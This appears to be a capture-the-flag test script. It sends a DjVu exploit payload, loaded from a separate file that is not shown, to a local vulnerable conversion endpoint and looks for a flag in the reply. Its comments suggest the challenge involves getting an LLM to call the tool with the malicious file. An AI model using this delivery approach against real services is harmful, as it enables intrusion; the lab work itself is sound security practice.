#!/usr/bin/env python3
"""
Direct test of the /convert endpoint to verify exploit works
This bypasses the LLM entirely
"""

import requests
import json

# Read our DjVu exploit
with open("payload_minimal.txt", "rb") as f:
    content = f.read()

# Try to decode as the app would receive it
try:
    djvu_string = content.decode('utf-8')
except:
    djvu_string = content.decode('latin-1')

print("[*] Testing direct call to /convert endpoint")
print(f"[*] Content size: {len(djvu_string)} bytes")
print(f"[*] First 50 chars: {repr(djvu_string[:50])}")

# Direct call to the vuln service
VULN_URL = "http://localhost:1337"

payload = {
    "args": [djvu_string],
    "kwargs": {}
}

print(f"\n[*] Sending POST to {VULN_URL}/convert")
print(f"[*] Payload: args[0] = {len(payload['args'][0])} bytes")

try:
    response = requests.post(
        f"{VULN_URL}/convert",
        json=payload,
        timeout=30
    )
    
    print(f"\n[+] Response status: {response.status_code}")
    result = response.json()
    
    print("\n[+] Response JSON:")
    print(json.dumps(result, indent=2))
    
    if "res" in result and result["res"]:
        print("\n[+] CONVERSION RESULT:")
        print("="*60)
        print(result["res"])
        print("="*60)
        
        if "flag" in result["res"].lower() or "bsides" in result["res"].lower():
            print("\n🎉 POSSIBLE FLAG FOUND IN OUTPUT!")
    
    if "err" in result:
        print(f"\n[!] Error from server: {result['err']}")
        
except requests.exceptions.ConnectionError:
    print("\n[!] Connection failed!")
    print("[!] Make sure the vuln container is running:")
    print("    cd dist && docker-compose up vuln")
except Exception as e:
    print(f"\n[!] Exception: {e}")
    import traceback
    traceback.print_exc()

print("\n[*] If this test WORKS, the problem is the LLM not calling the tool")
print("[*] If this test FAILS, the exploit itself has an issue")
